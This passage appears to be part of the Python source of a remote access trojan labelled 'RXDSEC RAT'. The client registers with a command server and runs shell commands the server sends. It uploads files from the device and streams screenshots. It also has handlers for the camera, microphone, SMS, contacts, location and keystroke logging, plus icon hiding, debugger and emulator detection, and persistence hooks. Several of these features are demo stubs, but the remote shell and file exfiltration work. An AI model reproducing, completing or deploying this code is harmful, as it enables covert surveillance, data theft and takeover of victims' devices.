        """Capture the current screen of the device"""
        try:
            # In a real implementation, this would use Android's MediaProjection API
            # For this demo, we'll simulate a successful capture
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"screen_{timestamp}.jpg"
            
            # Create a simulated screenshot (black 1x1 pixel)
            dummy_image_data = base64.b64encode(b"\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01\x08\x06\x00\x00\x00\x1f\x15\xc4\x89\x00\x00\x00\rIDATx\x9cc```\x00\x00\x00\x05\x00\x01\xa5\xf6E\xfb\x00\x00\x00\x00IEND\xaeB`\x82").decode('utf-8')
            
            # Return the base64-encoded image data
            return dummy_image_data, None
        except Exception as e:
            error_msg = f"Screen capture failed: {str(e)}"
            logger.error(error_msg)
            return None, error_msg
    
    def start_screen_stream(self, interval=1.0):
        """Start streaming the screen to the server
        
        Args:
            interval (float): Time interval between screen captures in seconds
            
        Returns:
            bool: True if streaming was started successfully, False otherwise
        """
        if hasattr(self, '_screen_stream_thread') and self._screen_stream_thread is not None:
            logger.warning("Screen streaming is already running")
            return False
            
        try:
            # Create a flag to control the streaming
            self._screen_streaming = True
            
            # Create a new thread for streaming
            self._screen_stream_thread = threading.Thread(
                target=self._screen_stream_worker,
                args=(interval,)
            )
            self._screen_stream_thread.daemon = True
            self._screen_stream_thread.start()
            
            logger.info(f"Screen streaming started with interval {interval}s")
            return True
        except Exception as e:
            logger.error(f"Failed to start screen streaming: {str(e)}")
            return False
    
    def stop_screen_stream(self):
        """Stop streaming the screen"""
        if not hasattr(self, '_screen_streaming') or not self._screen_streaming:
            logger.warning("Screen streaming is not running")
            return False
            
        try:
            # Set the flag to stop streaming
            self._screen_streaming = False
            
            # Wait for the thread to complete
            if hasattr(self, '_screen_stream_thread') and self._screen_stream_thread is not None:
                if self._screen_stream_thread.is_alive():
                    self._screen_stream_thread.join(5.0)  # Wait up to 5 seconds
                self._screen_stream_thread = None
            
            logger.info("Screen streaming stopped")
            return True
        except Exception as e:
            logger.error(f"Failed to stop screen streaming: {str(e)}")
            return False
    
    def _screen_stream_worker(self, interval):
        """Worker thread for screen streaming"""
        try:
            while self._screen_streaming:
                try:
                    # Capture the screen
                    screen_data, error = self.capture_screen()
                    
                    if screen_data:
                        # Send the screen data to the server
                        self._send_screen_data(screen_data)
                    else:
                        logger.warning(f"Failed to capture screen: {error}")
                        
                except Exception as e:
                    logger.error(f"Error in screen streaming: {str(e)}")
                
                # Wait for the next capture
                time.sleep(interval)
        except Exception as e:
            logger.error(f"Screen streaming thread crashed: {str(e)}")
        finally:
            logger.info("Screen streaming thread exited")
            
    def _send_screen_data(self, screen_data):
        """Send screen data to the server"""
        try:
            # Send the screen data to the server
            response = requests.post(
                f"{self.server_url}/api/submit_screen",
                json={"screen_data": screen_data},
                headers=self.headers,
                verify=self.secure
            )
            
            if response.status_code != 200:
                logger.warning(f"Failed to send screen data: {response.text}")
                
            return response.status_code == 200
        except Exception as e:
            logger.error(f"Error sending screen data: {str(e)}")
            return False
    
    def record_audio(self, duration=5, rate=44100):
        """Record audio from the device microphone"""
        if not ENABLE_MIC:
            return None, "Microphone access is disabled"
            
        try:
            # In a real implementation, this would use Android MediaRecorder API
            # For this demo, we'll simulate a successful recording
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"audio_{timestamp}.mp3"
            
            # Simulate recording delay
            time.sleep(min(duration, 2))  # Limit to 2 seconds for demo
            
            # Return a placeholder audio data
            return f"Simulated audio recording: {filename}, duration: {duration}s", None
        except Exception as e:
            error_msg = f"Audio recording failed: {str(e)}"
            logger.error(error_msg)
            return None, error_msg
    
    def collect_sms_messages(self, limit=100):
        """Collect SMS messages from the device"""
        if not ENABLE_SMS:
            return [], "SMS access is disabled"
            
        try:
            # In a real implementation, this would use Android ContentResolver
            # For this demo, we'll return simulated messages
            messages = []
            
            # Return placeholder data
            return messages, None
        except Exception as e:
            error_msg = f"SMS collection failed: {str(e)}"
            logger.error(error_msg)
            return [], error_msg
    
    def collect_call_logs(self, limit=100):
        """Collect call logs from the device"""
        if not ENABLE_SMS:  # Uses the same permission group
            return [], "Call logs access is disabled"
            
        try:
            # In a real implementation, this would use Android ContentResolver
            # For this demo, we'll return simulated call logs
            call_logs = []
            
            # Return placeholder data
            return call_logs, None
        except Exception as e:
            error_msg = f"Call log collection failed: {str(e)}"
            logger.error(error_msg)
            return [], error_msg
    
    def collect_contacts(self, limit=100):
        """Collect contacts from the device"""
        if not ENABLE_CONTACTS:
            return [], "Contacts access is disabled"
            
        try:
            # In a real implementation, this would use Android ContentResolver
            # For this demo, we'll return simulated contacts
            contacts = []
            
            # Return placeholder data
            return contacts, None
        except Exception as e:
            error_msg = f"Contacts collection failed: {str(e)}"
            logger.error(error_msg)
            return [], error_msg
    
    def get_location(self):
        """Get the current device location"""
        if not ENABLE_LOCATION:
            return None, "Location access is disabled"
            
        try:
            # In a real implementation, this would use Android LocationManager
            # For this demo, we'll return a simulated location
            location = {
                "latitude": 0.0,
                "longitude": 0.0,
                "accuracy": 0.0,
                "timestamp": datetime.utcnow().isoformat()
            }
            
            # Return placeholder data
            return location, None
        except Exception as e:
            error_msg = f"Location retrieval failed: {str(e)}"
            logger.error(error_msg)
            return None, error_msg
    
    def record_keystrokes(self, enable=True):
        """Enable or disable keystroke recording"""
        try:
            # In a real implementation, this would use an Accessibility Service
            # For this demo, we'll just return success
            status = "enabled" if enable else "disabled"
            return f"Keystroke recording {status}", None
        except Exception as e:
            error_msg = f"Keystroke recording configuration failed: {str(e)}"
            logger.error(error_msg)
            return None, error_msg

class RemoteAccessClient(AntiDetectionMixin, SurveillanceFeaturesMixin):
    def __init__(self, server_url, hide=False, secure=True):
        self.server_url = server_url
        self.device_id = self.load_device_id()
        self.headers = {'X-Device-ID': self.device_id}
        self.running = False
        self.secure = secure
        self.hide = hide
        
        # Apply anti-detection measures
        if self.hide:
            self.hide_app()
        
        # Check for debugging/emulation
        if self.detect_debugging():
            logger.warning("Debugging detected, taking evasive action")
            # In a real malicious app, this might alter behavior to appear benign
        
        if self.detect_emulator() and ANTI_EMULATOR:
            logger.warning("Emulator detected, taking evasive action")
            # In a real malicious app, this might exit or alter behavior
    
    def load_device_id(self):
        """Load device ID from persistent storage if available - cross-platform compatible"""
        global DEVICE_ID
        if DEVICE_ID:
            return DEVICE_ID
            
        # Try to load from appropriate platform-specific location
        system_name = platform.system()
        id_file = None
        
        try:
            if system_name == "Windows":
                # Try to load from Windows AppData
                app_data = os.environ.get('APPDATA', '')
                if app_data:
                    storage_dir = os.path.join(app_data, 'RxdSec')
                    id_file = os.path.join(storage_dir, '.device_id')
            
            elif system_name == "Darwin":  # macOS
                # Try to load from macOS Application Support
                home = os.path.expanduser("~")
                storage_dir = os.path.join(home, 'Library', 'Application Support', 'RxdSec')
                id_file = os.path.join(storage_dir, '.device_id')
            
            else:  # Linux / Android
                # Try to load from Linux/Android home directory
                home = os.path.expanduser("~")
                storage_dir = os.path.join(home, '.rxdsec')
                id_file = os.path.join(storage_dir, '.device_id')
            
            # Check if we found a valid file
            if id_file and os.path.exists(id_file):
                with open(id_file, 'r') as f:
                    device_id = f.read().strip()
                    if device_id:
                        DEVICE_ID = device_id
                        logger.debug(f"Loaded device ID from {id_file}")
                        return device_id
            
            # Fallback to current directory
            id_file = os.path.join(os.path.dirname(os.path.abspath(__file__)), '.device_id')
            if os.path.exists(id_file):
                with open(id_file, 'r') as f:
                    device_id = f.read().strip()
                    if device_id:
                        DEVICE_ID = device_id
                        return device_id
        except Exception as e:
            logger.error(f"Failed to load device ID: {e}")
            # Continue to generate a new ID
        
        # Generate a new ID
        device_id = hashlib.md5(f"{socket.gethostname()}-{time.time()}-{random.randint(1000, 9999)}".encode()).hexdigest()
        DEVICE_ID = device_id
        self.save_device_id()
        return device_id
    
    def save_device_id(self):
        """Save device ID to persistent storage - cross-platform compatible"""
        try:
            # Determine the appropriate storage location based on platform
            system_name = platform.system()
            
            if system_name == "Windows":
                # On Windows, store in AppData
                try:
                    app_data = os.environ.get('APPDATA', '')
                    if app_data:
                        storage_dir = os.path.join(app_data, 'RxdSec')
                        os.makedirs(storage_dir, exist_ok=True)
                        id_file = os.path.join(storage_dir, '.device_id')
                    else:
                        # Fallback to current directory
                        id_file = os.path.join(os.path.dirname(os.path.abspath(__file__)), '.device_id')
                except:
                    id_file = os.path.join(os.path.dirname(os.path.abspath(__file__)), '.device_id')
            
            elif system_name == "Darwin":  # macOS
                # On macOS, store in user's application support directory
                try:
                    home = os.path.expanduser("~")
                    storage_dir = os.path.join(home, 'Library', 'Application Support', 'RxdSec')
                    os.makedirs(storage_dir, exist_ok=True)
                    id_file = os.path.join(storage_dir, '.device_id')
                except:
                    id_file = os.path.join(os.path.dirname(os.path.abspath(__file__)), '.device_id')
            
            else:  # Linux / Android
                # On Linux/Android, store in a hidden directory in home
                try:
                    home = os.path.expanduser("~")
                    storage_dir = os.path.join(home, '.rxdsec')
                    os.makedirs(storage_dir, exist_ok=True)
                    id_file = os.path.join(storage_dir, '.device_id')
                except:
                    # Fallback to current directory
                    id_file = os.path.join(os.path.dirname(os.path.abspath(__file__)), '.device_id')
            
            # Write the device ID to file
            with open(id_file, 'w') as f:
                f.write(DEVICE_ID)
                
            logger.debug(f"Device ID saved to {id_file}")
        except Exception as e:
            logger.error(f"Failed to save device ID: {e}")
            # Silently continue even if saving fails
    
    def register_device(self):
        """Register this device with the server"""
        try:
            # Collect device information
            device_info = self.get_device_info()
            
            # Send registration request
            response = requests.post(
                f"{self.server_url}/api/register_device",
                json={"device_info": device_info},
                headers=self.headers,
                verify=self.secure
            )
            
            if response.status_code == 200:
                data = response.json()
                if data.get('status') == 'success':
                    if data.get('device_id'):
                        global DEVICE_ID
                        DEVICE_ID = data.get('device_id')
                        self.device_id = DEVICE_ID
                        self.headers = {'X-Device-ID': self.device_id}
                        self.save_device_id()
                    return True
            
            return False
        except Exception as e:
            logger.error(f"Registration error: {str(e)}")
            return False
    
    def get_device_info(self):
        """Get operating system version information - cross-platform compatible"""
        android_version = ""
        api_level = "0"
        model = ""
        manufacturer = ""
        system_name = platform.system()
        system_release = platform.release()
        
        try:
            # Check if we're on Android (Termux)
            if system_name == "Linux" and os.path.exists("/system"):
                # Try to get real Android information
                android_version = subprocess.check_output(['getprop', 'ro.build.version.release'], text=True).strip()
                api_level = subprocess.check_output(['getprop', 'ro.build.version.sdk'], text=True).strip()
                model = subprocess.check_output(['getprop', 'ro.product.model'], text=True).strip()
                manufacturer = subprocess.check_output(['getprop', 'ro.product.manufacturer'], text=True).strip()
            else:
                # For other platforms, use platform information
                android_version = f"{system_name} {system_release}"
                model = platform.machine()
                manufacturer = platform.processor() or "Unknown"
            
            # Check if we can get more sensitive information
            phone_number = ""
            imei = ""
            is_rooted = self.check_root()
            
            # Fallback to basic information if the above fails
            if not android_version:
                android_version = platform.version()
            if not api_level:
                api_level = "0"  # Unknown
            if not model:
                model = platform.machine()
            if not manufacturer:
                manufacturer = "Unknown"
            
            return {
                "name": f"{manufacturer} {model}",
                "android_version": android_version,
                "api_level": int(api_level) if api_level.isdigit() else 0,
                "model": model,
                "manufacturer": manufacturer,
                "phone_number": phone_number,
                "imei": imei,
                "is_rooted": is_rooted,
                "is_emulator": self.detect_emulator()
            }
        except Exception as e:
            logger.error(f"Error getting device info: {str(e)}")
            # Provide basic fallback information
            return {
                "name": "Android Device",
                "android_version": platform.version(),
                "api_level": 0,  # Unknown
                "model": platform.machine(),
                "manufacturer": "Unknown",
                "phone_number": "",
                "imei": "",
                "is_rooted": False,
                "is_emulator": False
            }
    
    def check_root(self):
        """Check if the device has elevated privileges - cross-platform compatible"""
        system_name = platform.system()
        
        try:
            # Different checks based on the platform
            if system_name == "Linux":
                # For Linux/Android
                # Check for su binary
                try:
                    which_su = subprocess.run(['which', 'su'], 
                                            stdout=subprocess.PIPE, 
                                            stderr=subprocess.PIPE,
                                            text=True)
                    
                    if which_su.returncode == 0 and which_su.stdout.strip():
                        return True
                except:
                    pass
                
                # Android-specific checks
                if os.path.exists("/system"):
                    # Check for common Android root apps/paths
                    root_paths = [
                        '/system/app/Superuser.apk',
                        '/system/xbin/su',
                        '/system/xbin/daemonsu',
                        '/system/etc/init.d/99SuperSUDaemon',
                        '/system/bin/.ext/.su',
                        '/system/bin/failsafe/su',
                        '/data/local/xbin/su',
                        '/data/local/bin/su',
                        '/sbin/su'
                    ]
                    
                    for path in root_paths:
                        if os.path.exists(path):
                            return True
                
                # Check if we're root on Linux
                return os.geteuid() == 0
            
            elif system_name == "Windows":
                # For Windows - check admin rights
                try:
                    import ctypes
                    return ctypes.windll.shell32.IsUserAnAdmin() != 0
                except:
                    # Alternative check - try to open a privileged file
                    try:
                        # Try to write to a protected location
                        temp_path = os.path.join(os.environ.get('windir', 'C:\\Windows'), 'temp_check_admin')
                        with open(temp_path, 'w') as f:
                            f.write('test')
                        os.remove(temp_path)
                        return True
                    except:
                        return False
            
            elif system_name == "Darwin":
                # For macOS
                # Check if we're root
                return os.geteuid() == 0
            
            return False
        except Exception as e:
            logger.debug(f"Root check error: {e}")
            return False
    
    def send_heartbeat(self):
        """Send heartbeat to server to maintain connection"""
        try:
            response = requests.post(
                f"{self.server_url}/api/heartbeat",
                headers=self.headers,
                verify=self.secure
            )
            
            return response.status_code == 200
        except Exception as e:
            logger.error(f"Heartbeat error: {str(e)}")
            return False
    
    def check_commands(self):
        """Check for pending commands from the server"""
        try:
            response = requests.get(
                f"{self.server_url}/api/get_commands",
                headers=self.headers,
                verify=self.secure
            )
            
            if response.status_code == 200:
                data = response.json()
                if data.get('status') == 'success':
                    return data.get('commands', [])
            
            return []
        except Exception as e:
            logger.error(f"Check commands error: {str(e)}")
            return []
    
    def execute_command(self, command):
        """Execute a command received from the server"""
        command_id = command.get('id')
        command_type = command.get('type')
        command_text = command.get('command')
        params = command.get('params', {})
        
        result = ""
        error = ""
        status = "executed"
        
        try:
            # Execute different types of commands
            if command_type == 'shell':
                # Execute shell command
                proc = subprocess.run(
                    command_text,
                    shell=True,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    text=True
                )
                result = proc.stdout
                error = proc.stderr
                
            elif command_type == 'camera':
                # Capture image from camera
                camera_id = params.get('camera_id', 0)
                result, error = self.capture_camera_image(camera_id)
                
            elif command_type == 'microphone':
                # Record audio
                duration = params.get('duration', 10)
                result, error = self.record_audio(duration)
                
            elif command_type == 'location':
                # Get location
                result, error = self.get_location()
                if result:
                    result = json.dumps(result)
                
            elif command_type == 'sms':
                # Get SMS messages
                limit = params.get('limit', 100)
                messages, error = self.collect_sms_messages(limit)
                result = json.dumps(messages) if messages else ""
                
            elif command_type == 'calls':
                # Get call logs
                limit = params.get('limit', 100)
                calls, error = self.collect_call_logs(limit)
                result = json.dumps(calls) if calls else ""
                
            elif command_type == 'contacts':
                # Get contacts
                limit = params.get('limit', 100)
                contacts, error = self.collect_contacts(limit)
                result = json.dumps(contacts) if contacts else ""
                
            elif command_type == 'keylogger':
                # Configure keylogger
                enable = params.get('enable', True)
                result, error = self.record_keystrokes(enable)
                
            elif command_type == 'screen_capture':
                # Capture a single screenshot
                screen_data, error = self.capture_screen()
                result = screen_data if screen_data else ""
            
            elif command_type == 'screen_stream_start':
                # Start screen streaming
                interval = params.get('interval', 1.0)
                success = self.start_screen_stream(interval)
                result = f"Screen streaming started with interval {interval}s" if success else "Failed to start screen streaming"
            
            elif command_type == 'screen_stream_stop':
                # Stop screen streaming
                success = self.stop_screen_stream()
                result = "Screen streaming stopped" if success else "Failed to stop screen streaming"
                
            elif command_type == 'hide_app':
                # Hide app icon
                success = self.hide_app()
                result = "App icon hidden" if success else "Failed to hide app icon"
                
            elif command_type == 'anti_debug':
                # Check for debugging
                is_debugged = self.detect_debugging()
                result = f"Debugging detected: {is_debugged}"
                
            else:
                # Unknown command type
                error = f"Unknown command type: {command_type}"
                status = "failed"
            
        except Exception as e:
            error = f"Command execution error: {str(e)}"
            status = "failed"
            logger.error(f"Error executing command {command_id}: {error}")
        
        # Update command status on server
        self.update_command_status(command_id, result, error, status)
    
    def update_command_status(self, command_id, result, error, status):
        """Update the status of a command on the server"""
        try:
            response = requests.post(
                f"{self.server_url}/api/update_command",
                json={
                    "command_id": command_id,
                    "result": result,
                    "error": error,
                    "status": status
                },
                headers=self.headers,
                verify=self.secure
            )
            
            return response.status_code == 200
        except Exception as e:
            logger.error(f"Update command status error: {str(e)}")
            return False
    
    def check_file_transfers(self):
        """Check for pending file transfers from the server"""
        try:
            response = requests.get(
                f"{self.server_url}/api/file_transfers",
                headers=self.headers,
                verify=self.secure
            )
            
            if response.status_code == 200:
                data = response.json()
                if data.get('status') == 'success':
                    return data.get('transfers', [])
            
            return []
        except Exception as e:
            logger.error(f"Check file transfers error: {str(e)}")
            return []
    
    def handle_file_transfer(self, transfer):
        """Handle a file transfer request"""
        transfer_id = transfer.get('id')
        file_path = transfer.get('file_path')
        file_name = transfer.get('file_name')
        direction = transfer.get('direction')
        
        try:
            if direction == 'upload':
                # Upload file to server
                if not os.path.exists(file_path):
                    raise FileNotFoundError(f"File not found: {file_path}")
                
                with open(file_path, 'rb') as f:
                    file_data = f.read()
                
                # Get file size
                file_size = len(file_data)
                
                # Send file to server
                files = {'file': (file_name, file_data)}
                response = requests.post(
                    f"{self.server_url}/api/upload_file",
                    files=files,
                    data={'transfer_id': transfer_id},
                    headers=self.headers,
                    verify=self.secure
                )
                
                if response.status_code != 200:
                    raise Exception(f"Upload failed: {response.text}")
                
                # Update file transfer status
                self.update_file_transfer_status(transfer_id, file_size, "", "completed")
                
            elif direction == 'download':
                # Download file from server
                response = requests.get(
                    f"{self.server_url}/api/download_file/{transfer_id}",
                    headers=self.headers,
                    verify=self.secure
                )
                
                if response.status_code != 200:
                    raise Exception(f"Download failed: {response.text}")
                
                # Save file
                os.makedirs(os.path.dirname(file_path), exist_ok=True)
                
                # In a real implementation, we would save the file data
                # For this demo, we'll just update the status
                self.update_file_transfer_status(transfer_id, 0, "", "completed")
                
            else:
                raise ValueError(f"Unknown transfer direction: {direction}")
                
        except Exception as e:
            error_msg = str(e)
            logger.error(f"File transfer error: {error_msg}")
            self.update_file_transfer_status(transfer_id, 0, error_msg, "failed")
    
    def update_file_transfer_status(self, transfer_id, file_size, error, status):
        """Update the status of a file transfer on the server"""
        try:
            response = requests.post(
                f"{self.server_url}/api/update_file_transfer",
                json={
                    "transfer_id": transfer_id,
                    "file_size": file_size,
                    "error": error,
                    "status": status
                },
                headers=self.headers,
                verify=self.secure
            )
            
            return response.status_code == 200
        except Exception as e:
            logger.error(f"Update file transfer status error: {str(e)}")
            return False
    
    def heartbeat_thread(self):
        """Thread for sending periodic heartbeats"""
        while self.running:
            try:
                self.send_heartbeat()
            except Exception as e:
                logger.error(f"Heartbeat thread error: {str(e)}")
            
            # Wait before sending next heartbeat
            time.sleep(30)  # Send heartbeat every 30 seconds
    
    def command_thread(self):
        """Thread for checking and executing commands"""
        while self.running:
            try:
                # Check for commands
                commands = self.check_commands()
                
                for command in commands:
                    # Execute command
                    self.execute_command(command)
                
                # Check for file transfers
                transfers = self.check_file_transfers()
                
                for transfer in transfers:
                    # Handle file transfer
                    self.handle_file_transfer(transfer)
                    
            except Exception as e:
                logger.error(f"Command thread error: {str(e)}")
            
            # Wait before checking again
            time.sleep(5)  # Check for commands every 5 seconds
    
    def run(self):
        """Main client loop"""
        try:
            # Register device with server
            if not self.register_device():
                logger.error("Failed to register device")
                return False
            
            logger.info(f"Device registered with ID: {self.device_id}")
            
            # Start threads
            self.running = True
            
            # Start heartbeat thread
            heartbeat_thread = threading.Thread(target=self.heartbeat_thread)
            heartbeat_thread.daemon = True
            heartbeat_thread.start()
            
            # Start command thread
            cmd_thread = threading.Thread(target=self.command_thread)
            cmd_thread.daemon = True
            cmd_thread.start()
            
            # Setup persistence if enabled
            if PERSISTENCE:
                self.setup_persistence()
            
            # Keep main thread alive
            while self.running:
                time.sleep(1)
                
            return True
            
        except Exception as e:
            logger.error(f"Client error: {str(e)}")
            return False
    
    def setup_persistence(self):
        """Setup persistence across reboots - cross-platform compatible"""
        if not PERSISTENCE:
            return
            
        # Get current system platform
        system_name = platform.system()
        logger.info(f"Setting up persistence on {system_name} platform")
        
        try:
            if system_name == "Windows":
                # Windows persistence methods
                self._setup_windows_persistence()
            elif system_name == "Linux" and os.path.exists("/system"):
                # Android persistence methods
                self._setup_android_persistence()
            elif system_name == "Linux":
                # Linux persistence methods
                self._setup_linux_persistence()
            elif system_name == "Darwin":
                # macOS persistence methods
                self._setup_macos_persistence()
            else:
                logger.warning(f"Persistence not implemented for {system_name}")
        except Exception as e:
            logger.error(f"Error setting up persistence: {e}")
    
    def _setup_windows_persistence(self):
        """Setup persistence on Windows platforms"""
        logger.info("Setting up Windows persistence")
        # In a real implementation, this would set up Windows startup methods:
        # - Registry run keys
        # - Task Scheduler
        # - Windows services
        # - Startup folder
            
    def _setup_android_persistence(self):
        """Setup persistence on Android platforms"""
        logger.info("Setting up Android persistence")
        # In a real implementation, this would implement various Android persistence methods:
        # - Broadcast receivers
        # - Job scheduling
        # - AlarmManager
        # - Foreground services
        # - Device admin features
            
    def _setup_linux_persistence(self):
        """Setup persistence on Linux platforms"""
        logger.info("Setting up Linux persistence")
        # In a real implementation, this would set up Linux startup methods:
        # - Systemd service
        # - Init scripts
        # - Cron jobs
        # - .bashrc/.profile modifications
            
    def _setup_macos_persistence(self):
        """Setup persistence on macOS platforms"""
        logger.info("Setting up macOS persistence")
        # In a real implementation, this would set up macOS startup methods:
        # - Launch Agents
        # - Launch Daemons
        # - Login items

def main():
    # Parse command line arguments
    parser = argparse.ArgumentParser(description='RXDSEC RAT - Advanced Remote Access Client')
    parser.add_argument('--server', dest='server_url', type=str, default=SERVER_URL,
                      help='URL of the remote control server')
    parser.add_argument('--hide', dest='hide', action='store_true',
                      help='Hide the app from launcher (Android) or system processes (Windows/Linux/macOS)')
    parser.add_argument('--secure', dest='secure', action='store_true',
                      help='Verify SSL certificates for secure communication')
    parser.add_argument('--platform', dest='platform', type=str, default='auto',
                      help='Specify platform manually (android, windows, linux, macos, or auto for autodetection)')
    
    args = parser.parse_args()
    
    # Display system information
    system_info = f"Running on {platform.system()} {platform.release()} ({platform.machine()})"
    logger.info(system_info)
    print(system_info)
    
    # Check if server URL is provided
    if args.server_url == "SERVER_URL_PLACEHOLDER":
        logger.error("Error: Server URL not specified. Please provide a valid server URL with --server")
        print("Error: Server URL not specified. Please provide a valid server URL with --server")
        print("Example: python payload.py --server http://your-server-url:5000")
        return
    
    # Create and run client
    client = RemoteAccessClient(
        server_url=args.server_url,
        hide=args.hide or HIDE_APP,
        secure=args.secure
    )
    
    # Run client in a separate thread
    client_thread = threading.Thread(target=client.run)
    client_thread.daemon = True
    client_thread.start()
    
    # Keep main thread alive
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        client.running = False
        print("Client stopping...")

if __name__ == "__main__":
    main()